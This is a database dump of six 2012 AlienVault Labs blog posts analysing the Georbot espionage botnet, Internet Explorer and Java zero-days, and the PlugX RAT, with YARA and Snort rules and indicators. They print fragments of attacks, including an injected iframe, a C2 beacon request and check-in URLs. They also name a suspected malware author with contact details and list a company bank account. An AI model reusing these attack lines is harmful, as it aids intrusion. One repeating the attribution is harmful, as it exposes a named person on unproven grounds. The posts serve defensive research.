INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (81, 'Georbot Botnet - A cyber espionage campaign against Georgian Government', 'Jaime Blasco', 'October 31, 2012 ', 'A few days ago, CERT-Georgia published a great report describing a cyber spionage campaign. ESET wrote a great report (http://blog.eset.com/wp-content/media_files/ESET_win32georbot_analysis_final.pdf) [no longer available] a few months ago as well. The report said the malware was found in Georgian Governmental Agencies including ministries, parliament, banks, ngo’s. The report also says the purpose of the malware was “Collecting Sensitive, Confidential Information about Georgian and American Security Documents” and it establishes a connection with Russian Official Security Agencies.In this blog post we will offer a brief about the infection vectors as well as the malware behavior and we will share some IOC’s and signatures to detect the presence of the malware in your systems.Infection methodTo compromise the victims, the attackers placed javascript code or iframes into websites leading to exploit code.The compromised website includes Georgian Government servers like ema.gov.ge. Other examples are:- ema.gov.ge- 31.214.140.214- 178.32.91.70- georgiaonline.xp3.biz- 31.31.75.63- 173.212.192.83An example of a malicious javascript is as follow:  The malicious javascript present in frame.js/frame.php includes code that exploits several vulnerabilities including CVE-2010-0842,   CVE-2006-3730, MS06-057 and some Java exploits.Examples of exploit codes found:178.32.91.70 [/] modules[/]docs[/]newexp[.]jar https://www.virustotal.com/file/9bf88bf15ffa6888ec2a3bd9e8dc6d13b650f1122ca69cface9ccf777c32e259/analysis/178.32.91.70 [/] modules[/]docs[/]Java-2010-0842[.]jarhttps://www.virustotal.com/file/7a900cc7616cfbf2ca17350c436af2490621550ded3e29325dc31149db50c63d/analysis/  Once the exploit code is executed, the payload calc.exe that contains the malware is downloaded from the remote server.The malware uses a custom packer to evade security security products. It also uses obfuscation to hide both the configuration values and the API calls.The malware uses byte substraction operations to hide the strings including the configuration values:  After deobfuscation:  We can use the following Yara rule to detect the obfuscated binary:rule GeorBotBinary{strings:$a = {63 72 ?? 5F 30 00 6B 65 72 6E 65 6C 33 32 2E 64 6C 6C}condition:all of them}Based on the deofuscated strings we can also write a Yara rule to detect the presence of the malware in memory:rule GeorBotMemory{strings:$a = {53 4F 46 54 57 41 52 45 5C 00 4D 69 63 72 6F 73 6F 66 74 5C 00 57 69 6E 64 6F 77 73 5C 43 75 72 72 65 6E 74 56 65 72 73 69 6F 6E 5C 00 52 75 6E 00 55 53 42 53 45 52 56}$b = {73 79 73 74 65 6D 33 32 5C 75 73 62 73 65 72 76 2E 65 78 65}$c = {5C 75 73 62 73 65 72 76 2E 65 78 65}condition:$a and ($b or $c)}We use both the registry key used to maintain persistence and the executable name that the malware creates on the system (in version >=5 of the malware those values are stored on wide strings).If we have a memory image of a system we can use Volatility to look for processes matching our Yara rule:$ python vol.py -f /Users/jaime/tmp/geor.img yarascan -y GeorBotMemory.yaraVolatile Systems Volatility Framework 2.1_alphaRule: GeorBotMemoryOwner: Process 833bd8e9fdf6f18 Pid 3680x004055b3 53 4f 46 54 57 41 52 45 5c 00 4d 69 63 72 6f 73 SOFTWARE\\.Micros0x004055c3 6f 66 74 5c 00 57 69 6e 64 6f 77 73 5c 43 75 72 oft\\.Windows\\Cur0x004055d3 72 65 6e 74 56 65 72 73 69 6f 6e 5c 00 52 75 6e rentVersion\\.Run0x004055e3 00 55 53 42 53 45 52 56 00 2e 64 6f 63 00 2e 78 .USBSERV..doc..xRule: GeorBotMemoryOwner: Process 833bd8e9fdf6f18 Pid 3680x004059a6 73 79 73 74 65 6d 33 32 5c 75 73 62 73 65 72 76 system32\\usbserv0x004059b6 2e 65 78 65 00 43 3a 5c 57 49 4e 44 4f 57 53 5c .exe.C:\\WINDOWS\\0x004059c6 73 79 73 74 65 6d 33 32 5c 75 73 62 63 6c 69 65 system32\\usbclie0x004059d6 6e 74 2e 65 78 65 00 43 3a 5c 57 49 4e 44 4f 57 nt.exe.C:\\WINDOWRule: GeorBotMemoryOwner: Process 833bd8e9fdf6f18 Pid 3680x004059ae 5c 75 73 62 73 65 72 76 2e 65 78 65 00 43 3a 5c \\usbserv.exe.C:\\0x004059be 57 49 4e 44 4f 57 53 5c 73 79 73 74 65 6d 33 32 WINDOWS\\system320x004059ce 5c 75 73 62 63 6c 69 65 6e 74 2e 65 78 65 00 43 \\usbclient.exe.C0x004059de 3a 5c 57 49 4e 44 4f 57 53 5c 73 79 73 74 65 6d :\\WINDOWS\\systemNetwork trafficThe malware uses HTTP to communicate with the C&C server. It contains several commands to upload and retrieve information from the victim. It also looks for malware updates every once in a while. In early versions the update version was requested from /modules/docs/upload/calc.exe on the C&C server.  In newer versions the malware performs a request to /calc.php and the server sends base64 encode content (it can be done using content from different servers at the same time).  When the malware starts it sends the following request to the C&C:  Every minute it sends the following HTTP request to the C&C to ask for instructions:  In newer versions the parameter “cam” was also introduced that tells the C&C whether the infected system has a webcam./index312.php?ver=5.1&cam=0&p=cert123&id=401acd00You can use the following snort to detect the presence of this malware in your network:alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:“ET MALWARE Georbot requesting update”; flow: to_server,established; content:”/modules/docs/upload/calc.exe”; http_uri; classtype:trojan-activity; sid:1111111112; rev:1;)alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:“ET MALWARE Georbot initial checkin”; flow: to_server,established; content:“POST”; http_method; nocase; content:”.php?ver=”; http_uri; content:”&p=cert123”; fast_pattern; http_uri; content:”&id=”; http_uri; classtype:trojan-activity; sid:1111111113; rev:1;)alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:“ET MALWARE Georbot checkin”; flow: to_server,established; content:”.php?ver=”; http_uri; content:”&p=bot123”; fast_pattern; http_uri; content:”&id=”; http_uri; classtype:trojan-activity; sid:1111111114; rev:1;)Emerging Threats Pro has coverage for previous versions (see “ETPRO TROJAN TDSS.xcn”) but the rules I posted will work with newer versions of the malware as well.Based on the behavior of the malware we wrote this OpenIOC rule:  You can download all the content from this blog post on the following url:https://github.com/jaimeblasco/AlienvaultLabs/tree/master/malware_analysis/GeorbotHappy Halloween!', 'malwareyarabotnetsnortopeniocgeorbotgeorgia', '/blogs/labs-research/georbot-botnet-a-cyber-espionage-campaign-against-georgian-government');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (82, 'New versions of the IExplorer ZeroDay emerge targeting Defence and Industrial companies', 'Jaime Blasco', 'September 19, 2012 ', 'As we related in our previous blog post the latest Internet Explorer ZeroDay is being used to target specific sectors including the Defence and Industrial ones.Following our investigations on the servers found serving the Internet Explorer Zeroday and using OSINT, we were able to use the WHOIS mail address and the ip addresses used by the attackers to find fake domains registered by them that contain specific names of companies related with:- US Aircraft and weapons delivery systems company- US Defence decoy countermeasures company- US Aerospace and defence technology company- US Supplier for repairs of tactical fighters- Laboratory for energetic systems and materials- UK Defence contractorWe also found a fake domain of a company that builds turbines and power sources used in several applications including utilities and power plants.We were able to check that the official website of the company has been compromised as well and it is serving the Internet Explorer ZeroDay to the visitors. They’ve included an iframe to the exploit in the entry page:The version of the exploit found seems to be based on the code that we found in the previous servers and also uses the Grumgog.swf Flash file to aid on the exploitation.Apart from that, it seems the exploit code has evolved and they are now able to infect not only Windows XP but also Windows 7 32 bits running Java6. This is based on the Dodge.html file we found within the exploit code:The flash file is also encrypted with DoSWF as the previous versions and licensed to [email protected] Once the vulnerability is triggered, the malicious code downloads the payload from /_include/site.exe.The payload is obfuscated with the same XOR 70 scheme and once again it contains a version of the PlugX RAT that we found in previous attacks.The PlugX RAT connect to a C&C server on oXXX.blogdns.com that resolvs to 142.4.46.214. I recommend you to search your logs for connections to that ip address since it will be a symptom of a compromised system.In the other hand, these Emerging Threats Snort rules will help you catching exploit attempts and related activity:2015704 - ET CURRENT_EVENTS DoSWF Flash Encryption Banner2015711 - ET CURRENT_EVENTS Internet Explorer execCommand fuction Use after free Vulnerability 0day2015712 - ET CURRENT_EVENTS Internet Explorer execCommand fuction Use after free Vulnerability 0dayHappy hunting!', '0dayplugxinternet explorerdefenceics', '/blogs/labs-research/new-versions-of-the-iexplorer-zeroday-emerge-targeting-defence-and-industri');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (83, 'The connection between the Plugx Chinese gang and the latest Internet Explorer Zeroday', 'Jaime Blasco', 'September 18, 2012 ', 'Some hours ago my friend PhysicalDrive0 pointed me to a new version of Moh2010.swf that was found in the wild as part of some content exploiting the last Internet Explorer Zeroday.The exploit code was being served on www.nod32XX.com hosted on:The exploit scheme is the same one, the original vector is hosted under /Exploit.html. It setups the img content and load the Moh2010.swf  file:- The file Moh2010.swf is a bit different than the previous one. It is also encrypted using DoSWF but the encrypted content is different:  We can also check that DoSWF is licensed to [email protected]:  Once the SWF file is executed it loads a new iframe:evalRdocument.body.innerHTML=“x<iframe src=Eternalian.html width=10 height=1></iframe>”This file is very similar to the Protect.html one that we described in our report yesterday.  It triggers the actual vulnerability. The swf file has sprayed the heap and the shellcode is in charge of downloading, decrypting and executing the payload.The HTTP headers on the server indicates that the files have been created four days ago meaning that the Zeroday vulnerability wasn’t mainstream yet:last-modified: Fri, 14 Sep 2012 05:29:51 GMTLast-Modified: Fri, 14 Sep 2012 05:30:07 GMTDue to the encryption of the SWF file using DoSWF the easiest way to obtain the original file is attaching to Internet Explorer and dumping the decrypted SWF file:  On the decrypted SWF file we found a Bytearray:  If we apply a base64 decode and then we apply a XOR E2 operation we obtain the URL of the malicious payload:www.nod32XX.com/test.exe (md5: fef2d60ec7ec015f1e119dc469b14f59)As we can see the content is obfuscated somehow. If we apply a XOR 70 operation on the bytes which value differs from 00 or 70 we obtain the original payload md5: 00fdb6ad7345c0912ea9d2fa4c49950e.The malicious payload contains several resources that are decompressed (Winrar) during execution:C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\RarSFX0\\Nv.exe MD5: 09B8B54F78A10C435CD319070AA13C28C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\RarSFX0\\Nv.mp3 MD5: B29265A6932E1FC4DEE6FA6908413A50C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\RarSFX0\\NvSmartMax.dll MD5: 0B21678ED8E2B117344CFCEBA8F097DDThe file NvSmartMax.dll is familiar, isn’t it? We described this technique http://labs.alienvault.com/labs/index.php/2012/tracking-down-the-author-of-the-plugx-rat/ [no longer available] some days ago. The file Nv.exe algo known as NvSmart.exe is a benign file signed by Nvidia and used widely by Nvidia in several applications.  Once Nv.exe is executed it loads NvSmartMax.dll that has been modified to execute the binary content present on  Nv.mp3.  Due to the fact that Nv.exe is digitally signed with a valid certificate it can bypass some of the Operating System restrictions and this technique is used to execute the malicious payload every time the system is booted.Surprise!. The actual payload present on Nv.mp3 is a version of the PlugX RAT that we uncovered a few days ago. Do you remember WHG, the guy behind it?.We can find the same debug path that we found in our previous blog post:d:\\work\\plug4.0(nvsmart)(sxl)\\shellcode\\shellcode\\XSetting.hd:\\work\\plug4.0(nvsmart)(sxl)\\shellcode\\shellcode\\XPlug.hThe RAT connect to the C&C server on exchange.likescandy.com currently pointing to 108.171.193.92:The RAT uses the well know Update Protocol, example:POST /update?id=000f6b50 HTTP/1.1Accept: */*X-Session: 0X-Status: 0X-Size: 61456X-Sn: 1User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.1; .NET CLR 1.1.4322; .NET CLR1.0.3705) Host: exchange.likescandy.comContent-Length: 0Connection: Keep-AliveCache-Control: no-cacheSummaryWe know that the group actively using the PlugX malware also called Flowershow had access to the Internet Explorer ZeroDay days before it was uncovered. Due tot he similarities of the new discovered exploit code and the one discovered some days ago it is very likely that the same group is behind both instances.They are using the PlugX RAT as well as the NvSmart technique found in previous targeted attacks in the past. In our previous post we were able to identify the author of this RAT and due to the similarities of the attacks it is very likely that the guy is involved somehow in this code.We’ve identify several ip addresses and domains that are currently used by this gang including:aol.selfip.com 180.210.204.180inmailbase.selfip.com 180.210.204.180exchange.from-sc.com 180.210.204.180exchange.likescandy.com 180.210.204.180exchange.is-a-landscaper.com 180.210.204.180leanov.gicp.net 180.210.204.180netbastthebash.dnsalias.net 180.210.204.180wwwh4ck.3322.org 180.210.204.180gary-freudenberger.homeftp.org 180.210.204.180aol.selfip.com 142.4.46.203ns18.doomdns.com 142.4.46.203exchange.from-sc.com 142.4.46.203exchange.likescandy.com 142.4.46.203exchange.is-a-landscaper.com 142.4.46.203I recommend you to check your logs for connections to those IPs/Domains to identify if your systems are targeted by them.More information regarding WHGAfter some research on Whg we were able to get some new information about him:- Whg went to Xihua (Sichuan province) University as revealed by other mail adress ([email protected]). You can find  references on Baidu/others where he talks about the university as well as source code written when he was a student.http://en.wikipedia.org/wiki/Network_Crack_Program_Hacker_(NCPH)_Group “The Network Crack Program Hacker (NCPH) group is a Chinese hacker group based out of Zigong in Sichuan Province”“Wicked Rose credits the Chinese hacker WHG, also known as “fig” as one of the developers of the GinWui rootkit. WHG is an expert in malicious code”“Security researchers discovered the rootkit on 18 May 2006 attackers utilized it in attacks on the US and Japan. Attackers introduced it to the US in an attack against a Department of Defense entity. They used two different versions of the rootkit in attacks during May and June 2006.”“After winning the military network attack/defense competition, the group obtained a sponsor who paid them 2000 RMB per month. IDefense believes their sponsor is likely the People’s Liberation Army (PLA) but has no definitive evidence to support this claim.” http://en.wikipedia.org/wiki/Tan_Dailin “Tan Dailin was a graduate student at Sichuan University when he was noticed (for attacking a Japanese site) by the People’s Liberation Army (PLA) in the summer of 2005. He was invited to participate in a PLA-sponsored hacking contest and won. He subsequently participated in a one-month, 16-hour-per-day training program where he and the other students simulated various cyber invasion methods, built dozens of hacking exploits, and developed various hacking tactics and strategies. He was chosen for the Sichuan regional team to compete against teams from Yunnan, Guizhou, Tibet, and Chongqing Military Districts. His team again ranked number one and he won a cash prize of 20,000 RMB.Then, under the pseudonym Wicked Rose, he formed the Network Crack Program Hacker (NCPH) Groupand recruited other talented hackers from his school. He found a funding source (an unknown benefactor) and started attacking US sites. After an initial round of successful attacks, his funding was tripled. All through 2006, NCPH built sophisticated rootkits and launched a barrage of attacks against multiple US government agencies. By the end of July, 2006, NCPH had created some 35 different attack variants for one MS Office vulnerability. During the testing phase, NCPH used Word document vulnerabilities. They switched to Excel and later to PowerPoint vulnerabilities. The result of all of this activity is that the NCPH group siphoned thousands, if not millions, of unclassified US government documents back to China.”\nWHG is not a core member of NCPH but a close affiliate of Wicked Rose.  WHG appears to be central to development of the NCPH rootkit, aka GinWui.  WHG is credited by Wicked Rose as one of the authors of this malicious code.  WHG is an experienced malicious code author with the following contact information:E-mail address: [email protected]QQ Number: 312016Website: http://cnasm.comReal Name: May be “Zhao Jibing”,赵纪斌.Location: Believed to be employed in the Sichuan province of China.Warlock: Master of the Arcane game After reviewing the files used to exploit the Internet Explorer vulnerability we’ve identified that those guys are fans of a game called “Warlock: Master of the Arcane”. The are using several variables inside the code that refers to Warlock’s Great Mages names. Some examples are:King Lich V inside the decrypted SWF file<body onload=’Elpiritster();‘onselect=‘TestArray()’> on the Eternalian.html file.I hope you enjoyed this blog post!Update: During the last few hours we found two more sites that were serving the Zeroday exploit in the past.The first file we found was a version of Protect.html that was being served in the webpage of one of the main Defense News Portal in India. It contains code to trigger the Internet Explorer vulnerability and it was being served four days ago. We couldn’t retrieve the actual payload and it seems the malicious content is not there anymore.The second server that was serving the exploit seems to be a fake domain of the 2nd International LED professional Symposium +Expo and it was taken down a few hours ago:led-professional-symposium.orgCreated On:06-Jul-2012 07:04:31 UTCLast Updated On:18-Sep-2012 17:08:27 UTCExpiration Date:06-Jul-2013 07:04:31 UTCSponsoring Registrar:GoDaddy.com, LLC (R91-LROR)Status:CLIENT DELETE PROHIBITEDStatus:CLIENT RENEW PROHIBITEDStatus:CLIENT TRANSFER PROHIBITEDStatus:CLIENT UPDATE PROHIBITEDRegistrant ID:CR118174435Registrant Name:Gexin sunRegistrant Street1:Yaroslaviv Val Street, Kyiv, 01034,Registrant City:KievRegistrant State/Province:KievRegistrant Postal Code:03022Registrant Country:UARegistrant Phone:+380.952756104Registrant Email:[email protected]The first vector was hosted under led.html:  The code is very similar to the previous ones. Notice that the name of the swf used is different Grumgog.swf. Also notice that Grumgog is also a term used in the “Warlock: Master of the Arcane game” The flash file is also encrypted with DoSWF using the license key issued to “[email protected]” as in the previous version.Once decrypted we identified that an iframe is loaded (Dodge.html). We couldn’t retrieve the original content.Once the vulnerability is triggered, the malicious payload is downloaded from update.exe (the file was removed at the time of the analysis).It seems the guys behind this 0day were targeting specific industries. We’ve seen that they compromised a news site related to the defense industry and they created a fake domain related to LED technologies that can be used to perform spearphishing campaigns to those industries.', 'plugxinternet explorerzerodayflowershowwhg', '/blogs/labs-research/the-connection-between-the-plugx-chinese-gang-and-the-latest-internet-explo');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (84, 'New Internet Explorer zero day being exploited in the wild', 'Jaime Blasco', 'September 17, 2012 ', 'After the http://labs.alienvault.com/labs/index.php/2012/new-java-0day-exploited-in-the-wild/ [no longer available] last zero day exploit on Java we reported some weeks ago it appears that a new 0day has been found in Internet Explorer by the same authors that created the Java one.Yesterday, Eric Romang reported the findings of a new exploit code on the same server that the Java 0day was found some weeks ago. The new vulnerability appears to affect Internet Explorer 7 and 8 and seems to be exploitable at least on Windows XP.The exploit code found in the server works as follow:- The file exploit.html creates the initial vector to exploit the vulnerability and loads the flash file Moh2010.swf.- Moh2010.swf is a flash file encrypted using DoSWF http://www.doswf.com [no longer available]. We’ve seen the usage of DoSWF in the exploit code of other targeted attacks such as:- http://labs.alienvault.com/labs/index.php/2012/several-targeted-attacks-exploiting-adobe-flash-player-cve-2012-0779/ [no longer available] Several Targeted Attacks exploiting Adobe Flash Player (CVE-2012-0779)The Flash file is in charge of doing the heap spray. Then it loads Protect.html  Due to the usage of DoSWF, the malicious code is encrypted. The easiest way to obain the decrypted content is executing the file within Internet Explorer and attaching to the process once the content is decrypted. Then you can obtain the raw content when we can find the following Bytearray declared:  If we obtain the raw content of the hexadecimal string and then we apply a XOR “E2” operation we can obtain the following bytes that contains the URL of the malicious payload.    - Protect.html checks if the system is running Internet Explorer version 7 or 8 under Windows XP. If the victim satisfies those conditions, the vulnerability is triggered and the malicious payload is executed.  The payload dropped is Poison Ivy as in the http://labs.alienvault.com/labs/index.php/2012/new-java-0day-exploited-in-the-wild/previous Java 0day [no longer available].https://www.virustotal.com/file/85ad20e922f5e9d497ec06ff8db5af81fbdcbb6e8e63dc426b8faf40d5cc32c6/analysis/The C&C server configured is ie.aq1.co.uk that is currently resolving to 12.163.32.15:We’ve also seen that the domain used in the previous attacks hello.icon.pk is also pointing to the new IP address.Once executed, the payload creates the file C:\\WINDOWS\\system32\\mspmsnsv.dll and the service WmdmPmSN is configured and started.It seems the Metasploit guys are already woking on a Metasploit module so let’s see how fast Microsoft handle the issue.More info coming soon!Update:Metasploit has released a working exploitYou can download the following Yara rule http://alienvault-labs-garage.googlecode.com/files/ie80day.yara [no longer available] to match both exploit versions.', 'aptinternet explorerexploittargeted', '/blogs/labs-research/new-internet-explorer-zero-day-being-exploited-in-the-wild');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (85, 'Tracking down the author of the PlugX RAT', 'Jaime Blasco', 'September 13, 2012 ', 'Some days ago, TrendMicro published some information about a new version of a RAT called PlugX. From the last few months we have been tracking a group using the PlugX RAT that has been attacking different targets especially in Japan, Taiwan, Korea and against Tibetan organizations and individuals.In this post we will focus on the intelligence we have extracted from the payloads of the attacks and how we used this information to track the author of the RAT that is very likely to be involved in the attacks as well.During the past few months we have seen some spearphishing campaigns against Tibetan targets using mainly Microsoft Office Exploits (CVE-2012-0158). Those documents used a very tricky technique; the payload dropped was a benign Nvidia executable (NvSmart.exe), a DLL (NvSmartMax.dll) and a binary file (boot.ldr) This technique was explained by Symantec as well.NvSmart.exehttps://www.virustotal.com/file/523d28df917f9d265cd2c0d38df26277bc56a535145100ed82e6f5fdeaae7256/analysis/As we can see the binary file is signed by Nvidia since it is a benign file used on some Nvidia applications. Once NvSmart.exe is executed, it loads NvSmartMax.dll. The attackers drop a modified version of NvSmartMax.dll which executes the binary content present on boot.ldr that contains the actual malicious code.Since NvSmart.exe is configured to run when the computer starts and it contains a valid digital signature, it will bypass some of the OS restrictions and the malicious code will be executed when the system boots.Once the payload is executed, a decoy file is shown to the user as in most of the attacks we have seen in the past few years.Here is an example of some of the decoy content used by the attackers:   It happens that in most of the boot.ldr files we have found the RAT called PlugX.At the beginning of our investigations some months ago, we found out that in some of the PlugX binaries we were able to extract some debug paths like:Hash: c1c80e237f6fbc2c61b82c3325dd836f3849ca036a28007617e4e27ba2f16c4bDebug Path: d:\\work\\plug4.0(nvsmart)(sxl)\\shellcode\\shellcode\\XPlug.hCompilation date: 6/17/2012 16:44:58Hash: 1a091c2ddf77c37db3274f649c53acfd2a0f14780479344d808d089faa809a_HHDL’s Birthday Celebration.docDebug Path: d:\\work\\Plug3.0(Gf)UDP\\Shell6\\Release\\Shell6.pdbCompilation date: 6/17/2012 16:44:58Hash: 42813b3a43611efebf56239a1200f8fc96cd9f3bac35694b842d9e8b02aDebug Path: d:\\work\\plug4.0(nvsmart)\\shellcode\\shellcode\\XPlug.hCompilation date: 5/26/2012 7:16:08Hash: 28762c22b2736ac9728feff579c3256bd5d18bdfbf11b8c00c68d6bd905af5b8Debug Path: d:\\work\\plug3.1(icesword)\\shellcode\\shellcode\\XPlug.hCompilation date: 6/14/2012 6:06:00It seems that there are several versions of the RAT and if you take a look at the binaries you will realize that there are some changes and new capabilities in each version.We searched through our collection to see if we could find other XPlug samples apart from the ones dropped by the malicious documents we had. We found some other samples:Hash: 3b01677582e7a56942a91da9728c6251- financial_report.exeDebug Path: C:\\Users\\whg\\Desktop\\Plug\\FastGui(LYT)\\Shell\\Release\\Shell.pdbCompilation date: 6/17/2012 16:44:58Hash: 60ee900d919da8306b7b6dbe7e62fee49f00ccf141b2e396f5a66be51a00e34fDebug Path: C:\\Documents and Settings\\whg\\\\Plug\\FastGui(LYT)\\Shell\\Release\\Shell.pdbCompilation date: 2012-03-12 07:04:12Hash: c00cd2dcddbb24383a3639ed56e68a24dc4561b1248efa4d53aa2b68220b4b2aDebug Path: C:\\Users\\whg\\Desktop\\Plug\\FastGui(LYT)\\Shell\\Release\\Shell.pdbCompilation date: 3/12/2012 14:23:58As we can see the debug paths found on those files are a bit more interesting since the path contains a username “whg”. We have two different paths, “C:\\Documents and Settings\\whg\\” and  “C:\\Users\\whg\\” so it is likely that in the first case the author is using a Windows XP system and in the second one he is using a Vista/7 system.With this information, we began to search binary files that contain similar debug paths. Our search found an application called SockMon that leads us to http://www.cnasm.com/view.asp?classid=49&newsid=320 and http://www.cnasm.com/view.asp?classid=49&newsid=315.The debug paths that we found in files that belong to a different SockMon version are the following ones:C:\\Users\\whg\\Desktop\\SockMon2011\\SockMon\\UnitCache.pasc:\\Documents and Settings\\whg\\SockMon2010\\RunProtect\\Release\\RunProtect.pdbc:\\Documents and Settings\\whg\\\\SockMon2010\\SmComm\\Release\\SmComm.pdbWe also found another library called vtcp (http://www.cnasm.com/vtcpsdk/) that contains the following debug path:C:\\Users\\whg\\Desktop\\vtcp11.0lib\\vtcpT0\\UnitMain.pasDoes this all look familiar to you?. It seems that the user “whg” has compiled these components and he is also running a couple of machines with different paths that correspond to the ones we found on the XPlug RAT.If we take a look at cnasm.com we can find the following contact information:email: whg0001 at 163.comQQ: 312016So the mail address also coincide with the username we found in the debug path of the RAT samples.Let’s see what we find about whg0001 at 163.com. The mail address was used as the administrative contact of the domain chinansl.com back in 2000:Domain Name      : chinansl.comPunnyCode        : chinansl.comCreation Date    : 2000-08-08 00:00:00Updated Date     : 2012-02-29 11:26:22Expiration Date  : 2013-08-08 00:00:00Registrant:Organization   : chinansl technology co.，itdName           : lishiyunAddress        : Room E8BC , XiangFu Garden , 3rd Southern portion of 2nd ringroad , Chengdu , SiCity           : chengdushiProvince/State : sichuanshengCountry        : chinaPostal Code    : 610041Administrative Contact:Name           :Organization   : chinansl technology co.，itdAddress        :City           : chengdushiProvince/State : sichuanshengCountry        : chinaPostal Code    : 610041Phone Number   :Fax            : 086-028-85459578Email          : [email protected]More information about the company, overview:Company Name: CHINANSL TECHNOLOGY CO.,LTD.Address: Chengdu National Information Security Production Industrialization Base , 2nd Floor ,No.8 Chuangye   RoadTelephone: 02866853362Custom Code: 5101730218773Company Code: 730Account-opening Bank: Xisanqi Sub-branch, Beijing Branch, Bank of ChinaAccount Name: Beijing Lingtong Economic Consulting Co., LtdAccount Number: 813715881608091001  From the information we collected it seems to be a Chinese company related to the security industry. Of course!We also found a software component called “Parent Carefree Filter”https://www.virustotal.com/file/3babb326615b899e976a1a9dc51ec04118701a5de702494f1d363194060c5db7/analysis/publisher….............: CHINANSLproduct…...............: Parent Carefree Filterinternal name….........: FamHookfile version…..........: 3, 0, 0, 1original name….........: FamHook.dllcopyright….............: CHINANSLdescription…...........: Parent Carefree FilterAnd of course we found similar debug paths on the file:c:\\Documents and Settings\\whg\\Pnw(all)\\Pc()\\FamHook\\Release\\FamHook.pdbYou can find some advisories that Chinansl published back to 2000:CHINANSL Security Advisory(CSA-200110)Tomcat 4.0-b2 for winnt/2000 show “.jsp” source VulnerabilityCHINANSL Security Advisory(CSA-200011)PHP AND APACHE VulnerabilityCHINANSL Security Advisory(CSA-200012)Ultraseek Server 3.0 VulnerabilityCHINANSL Security Advisory(CSA200013)IBM WCS local user exceed his authority to access another fileCHINANSL Security Advisory(CSA-200105)Tomcat 3.0 for win2000 Directory traversal VulnerabilityCHINANSL Security Advisory(CSA-200106)JavaServer Web Dev Kit(JSWDK)1.0.1 for win2000 Directory traversal VulnerabilityCHINANSL Security Advisory(CSA-200108)Tomcat 3.2.1 for win2000 Directory traversalCHINANSL Security Advisory(CSA-200107)IBM WCS 4.0.1 + Application Server 3.0.2 for Solaris 2.7 show “.jsp” source Vulnerability.CHINANSL Security Advisory(CSA-200109)Tomcat 4.0-b1 for winnt/2000 show “.jsp” source Vulnerability.About whg0001 we can find several references on the Internet about him.They describe him as “Virus expert. Proficient in assembly.”.And finally here is the CSDN profile where you can find a photo of him:At this point you must be thinking we cannot accuse whg of being related to the XPlug RAT and the targeted campaigns just for a couple of debug paths inside the binary, can we?Ok, here is the final touch. After searching for more versions of the PlugX RAT we found these two samples:2ba7f1cc1f46a17ccfbef6b327d8c4e47f9d56922debcad27e5db569f4cf818d51e50d810172591ee04e12cfce0792f3154356588eacadc01288e3a4fda915fbThey contains this debug path:i:\\work\\plug2.0()\\shellcode\\shellcode\\XPlug.hand the following URL:http://tieba.baidu.com/f?kz=866965377that seems to be used as a test or to check connectivity (more info in future posts).Surprisingly when you open the URL you can see the following:  is this guy familiar to you?With the information we have, we can say that this guy is behind the active development of the PlugX RAT. We can also say he has probably some inside of the operations since this path“d:\\work\\plug4.0(nvsmart)\\shellcode\\shellcode\\XPlug.h” tells us that he knew the RAT was going to be weaponized through the Nvsmart technique to be used in the spearphishing campaigns.According to the information on this research http://www.commandfive.com/papers/C5_APT_SKHack.pdf a previous version of this malware also called Thoper/Tvt/Sogu was used to compromise SK Communications in South Korea back in 2011.', 'aptplugxratthopersogutvt', '/blogs/labs-research/tracking-down-the-author-of-the-plugx-rat');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (86, 'New Java 0day exploited in the wild', 'Jaime Blasco', 'August 27, 2012 ', 'A few hours ago, FireEye published some information related to a new Java 0day exploited in the wild.The malicious JAR file was served fromÂ ok.aa24.net / meeting / index.htmlThe html loads the Java applet passing some parameters that are used later to build the URL to download the payload. The HTML is encrypted using “Dadong’s JSXX 0.44 VIP”.The Java applet contains the following two .class files:-Â cve2012xxxx/Gondzz.class-Â cve2012xxxx/Gondvv.classThe applet check if the system is running Windows and gets the parameters passed from the HTML that contains the URL to download the payload. If the system is vulnerable, the payload is downloaded and executed in the system.On the analyzed sample the payload is downloaded fromÂ ok.aa24.net / meeting / hi.exehttps://www.virustotal.com/file/09d10ae0f763e91982e1c276aad0b26a575840ad986b8f53553a4ea0a948200f/analysis/1346055031/The payload dropsÂ C:\\WINDOWS\\system32\\mspmsnsv.dll (replace the file if present) and starts the Portable Media Serial Number Service.The malware connects toÂ hello.icon.pk port 80. It seems to be a Poison Ivy variant.hello.icon.pk resolvs to:223.25.233.244223.25.233.0 - 223.25.233.2558 to Infinity Pte LtdYou can use the following generic Yara rule to detect a malicious .class file exploiting this vulnerability:rule Java0daycve2012xxxx_generic{Â  meta:Â  Â  Â weight=100Â  Â  Â author = \"Jaime Blasco\"Â  Â  Â source = \"alienvault\"Â  Â  Â date = \"2012-08\"Â  strings:Â  Â  Â  Â  $ = Â \"java/security/ProtectionDomain\"Â  Â  Â  Â  $ = \"java/security/Permissions\"Â  Â  Â  Â  $ = \"java/security/cert/Certificate\"Â  Â  Â  Â  $ = \"setSecurityManager\"Â  Â  Â  Â  $ = \"file:///\"Â  Â  Â  Â  $ = \"sun.awt.SunToolkit\"Â  Â  Â  Â  $ = \"getField\"Â  condition:Â  Â  all of them}A module has just been published for Metasploit so it is time to disable Java in all your systemsAnd remember to search your logs for connections to the Domains/IPs related to this attack.Have a great day!', 'zerodayjava', '/blogs/labs-research/new-java-0day-exploited-in-the-wild');
